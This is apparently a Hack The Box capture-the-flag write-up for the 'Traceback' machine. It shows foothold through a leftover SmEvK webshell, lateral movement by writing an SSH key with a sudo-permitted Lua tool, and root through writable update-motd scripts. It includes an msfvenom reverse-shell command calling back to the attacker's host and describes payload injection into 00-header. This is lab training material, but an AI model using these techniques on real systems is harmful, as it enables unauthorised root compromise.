I"y0<p><strong><center>Ref°: HTB-13-Boot2Root</center></strong></p>

<p><img src="/assets/images/traceback/HTB-Badge-Traceback.png" alt="Desktop View" /></p>

<p>— Traceback is a Linux machine that highlights the exploitation of backdoor (from webshell smevk) present behind a website to gained a foothold. This give us a possibility to enum and find a way to execute lateral movement on user sysadmin through lua script and misconfiguration sudo.</p>

<p>Scripts in /etc/update-motd.d/* running under root privileges can be write-edited by the user “sysadmin”. This gives the possibility to place  payload and grab a “reverse shell” with root privileges.</p>

<p><img src="/assets/images/traceback/HTB-Information-Traceback.png" alt="Desktop View" /></p>

<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
<h3 id="network-service-scanning">Network Service Scanning</h3>
<hr />
<p>The nmap scan reveals <code class="language-plaintext highlighter-rouge">SSH</code> and <code class="language-plaintext highlighter-rouge">Apache</code> to be running on their usual ports; 22 and 80.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nt">-T5</span> 10.10.10.181 <span class="nt">-p-</span>
</code></pre></div></div>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-nmap.png" alt="Desktop View" /></p>

<h3 id="website-defaced">Website defaced</h3>
<hr />
<p>We discover deface site on web service. Apparently <code class="language-plaintext highlighter-rouge">Xh4H hacker</code> left a <code class="language-plaintext highlighter-rouge">backdoor</code>, maybe to exploit it later.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-web.png" alt="Desktop View" /></p>

<p>The hacker left us a hint in the source code by adding as a comment in the html code this : <code class="language-plaintext highlighter-rouge">Some of the best web shells that you might need ;)</code>.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-source.png" alt="Desktop View" /></p>

<p>This hint is a reference of the following webshells from github repository : <a href="https://github.com/TheBinitGhimire/Web-Shells">https://github.com/TheBinitGhimire/Web-Shells</a></p>

<p>A <code class="language-plaintext highlighter-rouge">webshell</code> is a web security threat, which is a web-based implementation of the shell concept. 
A webshell is able to be uploaded to a web server to allow remote access to the web server, such as the web server’s file system. 
A webshell is unique in that it enables users to access a web server by way of a web browser that acts like a command-line interface.</p>

<h2 id="2-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[2] Foothold - Get into the target </span></strong></h2>
<h3 id="finding-smevk-webshell">Finding SmEvK Webshell</h3>
<hr />
<p>After testing them all, we find the webshell concerned : <code class="language-plaintext highlighter-rouge">SmEvK_PaThAn Shell V3</code> on http://10.10.10.181/smevk.php</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-webshell.png" alt="Desktop View" /></p>

<p>We success to log-in the webshell with credential mentionned in the source code : <code class="language-plaintext highlighter-rouge">admin / admin</code></p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-githubwebshell.png" alt="Desktop View" /></p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-webshell2.png" alt="Desktop View" /></p>

<p>The exploitation is successful and we have gained a foothold.</p>

<h2 id="lateral-movement---move-through-environment"><strong><span style="color:#c0392b">Lateral Movement - Move through environment</span></strong></h2>
<h3 id="sudo-misconfiguration">Sudo Misconfiguration</h3>
<hr />
<p>Enum with webadmin account and check the file /etc/passwd to find an other interesting system user : sysadmin</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-passwd.png" alt="Desktop View" /></p>

<p>User sysadmin may run the following commands with no password under root privilege <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: /home/sysadmin/luvit</code></p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-misconfigurationsudo.png" alt="Desktop View" /></p>

<p>We find file under <code class="language-plaintext highlighter-rouge">/home/webadmin/note.txt</code> which refers to a tool to practice lua.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-notes.png" alt="Desktop View" /></p>

<p><code class="language-plaintext highlighter-rouge">Lua</code> is a lightweight, high-level, multi-paradigm programming language designed primarily for embedded use in applications.</p>

<p>The tool to practice lua script is <code class="language-plaintext highlighter-rouge">Luvit</code>. He is mentionned above on the result of the command sudo -l.</p>

<h3 id="ssh-authorized-keys">SSH Authorized Keys</h3>
<hr />
<p>With present misconfiguration on sudo command for the sysadmin user, we use personnal lua script to send my public ssh key in her folder <code class="language-plaintext highlighter-rouge">*/.ssh/authorized_keys</code>. Same method in other machine : See Postman Writeup.</p>

<p>Reference - lua script : <a href="https://www.tutorialspoint.com/lua/lua_file_io.htm">https://www.tutorialspoint.com/lua/lua_file_io.htm</a></p>

<p>After search in the documentation, we can define the script pattern to be used :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CODEfile <span class="o">=</span> io.open <span class="o">(</span>filename <span class="o">[</span>, mode]<span class="o">)</span>
file:write<span class="o">(</span><span class="s2">"--test"</span><span class="o">)</span>
file:close<span class="o">()</span>
.....
filename <span class="o">=</span> <span class="s2">"/home/sysadmin/.ssh/authorized_keys"</span>
mode <span class="o">=</span> <span class="s2">"a"</span> Append mode that opens an existing file or creates a new file <span class="k">for </span>appending.
<span class="nt">--test</span> <span class="o">=</span> <span class="s2">"pub ssh key value"</span>
</code></pre></div></div>

<p>We generate our ssh key pair to put the public key value in our lua script.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh-keygen <span class="nt">-t</span> rsa <span class="nt">-b</span> 2048
</code></pre></div></div>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-scriptlua.png" alt="Desktop View" /></p>

<p>We upload the script from the webshell and execute this under root privilege.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-upload.png" alt="Desktop View" /></p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-runscript.png" alt="Desktop View" /></p>

<h3 id="remote-service-ssh-login">Remote Service SSH login</h3>
<hr />
<p>We have now the possibility to connect on sysadmin through ssh :</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>ssh sysadmin@10.10.10.181 <span class="nt">-i</span> traceback
</code></pre></div></div>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-sysadminssh.png" alt="Desktop View" /></p>

<h3 id="flag-user">Flag user</h3>
<hr />
<p>We flag the user to validate the compromission of the system user.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-userflag.png" alt="Desktop View" /></p>

<h2 id="3-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[3] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
<h3 id="privilege-misconfiguration">Privilege Misconfiguration</h3>
<hr />
<p>We use linpeas script to check every possible path to increase our privilege.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-sendlinpeas.png" alt="Desktop View" /></p>

<p>The script reveal interesting group named <code class="language-plaintext highlighter-rouge">/etc/update-motd.d</code> where many files are writables with sysadmin privilege.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-groupwfiles.png" alt="Desktop View" /></p>

<p>We can confirm that with <code class="language-plaintext highlighter-rouge">ls -la</code> command.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-verifwfile.png" alt="Desktop View" /></p>

<p>According to linux manual :</p>

<p>“UNIX/Linux system adminstrators often communicate important information to console and remote users by maintaining text in the file /etc/motd, which is displayed by the pam_motd(8) module on interactive shell logins. Traditionally, this file is static text, typically installed by the distribution and only updated on release upgrades, or overwritten by the local administrator with pertinent information.</p>

<p>Ubuntu introduced the update-motd framework, by which the motd(5) is dynamically assembled from a collection of scripts at login.</p>

<p>Executable scripts in /etc/update-motd.d/* are executed by pam_motd(8) as the root user at each login, and this information is concatenated in /var/run/motd. The order of script execution is determined by the run-parts(8) –lsbsysinit option (basically alphabetical order, with a few caveats).”</p>

<p>Reference - Manual Linux Update-motd.d : <a href="http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html">http://manpages.ubuntu.com/manpages/trusty/man5/update-motd.5.html</a></p>

<p>Here you can see how this works when you log on to ssh :</p>

<p>For this example /etc/update-motd.d/<code class="language-plaintext highlighter-rouge">00-header</code> file = <code class="language-plaintext highlighter-rouge">Welcome to Xh4H land</code></p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-headerssh.png" alt="Desktop View" /></p>

<p>The use of the <code class="language-plaintext highlighter-rouge">pspy tool</code> confirms the execution of these scripts under root privilege <code class="language-plaintext highlighter-rouge">(UID 0)</code>.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-checkprocess.png" alt="Desktop View" /></p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-sshview.png" alt="Desktop View" /></p>

<h3 id="obtaining-reverse-shell-with-payload-injection">Obtaining Reverse Shell with Payload Injection</h3>
<hr />
<p>We can push custom payload into one of theses script to get reverse shell under root privilege when they are executed.</p>

<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nt">-f</span> elf <span class="nt">-o</span> shell <span class="nv">LHOST</span><span class="o">=</span>10.10.14.54 <span class="nv">LPORT</span><span class="o">=</span>4444
</code></pre></div></div>

<p>After creating our payload, we send it to our target machine and place it in the /tmp/ folder.</p>

<p>Now we can call our payload to be executed in one of the scripts in the update-motd.d folder. I choose 00-header.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-insertpayload.png" alt="Desktop View" /></p>

<p>We prepare our attacking machine to receive the shell with nc command and we launch new ssh connexion.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-viewexploit.png" alt="Desktop View" /></p>

<h3 id="flag-root">Flag root</h3>
<hr />
<p>We obtained the shell under root privilege. We have compromise Traceback machine.</p>

<p><img src="/assets/images/traceback/HTB-Images-Traceback-rootflag.png" alt="Desktop View" /></p>

<hr />

<h2 id="trophy"><strong><center>Trophy</center></strong></h2>

<blockquote>
  <p><strong>Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.</strong></p>

  <p>Chanda Kochhar</p>
</blockquote>
:ET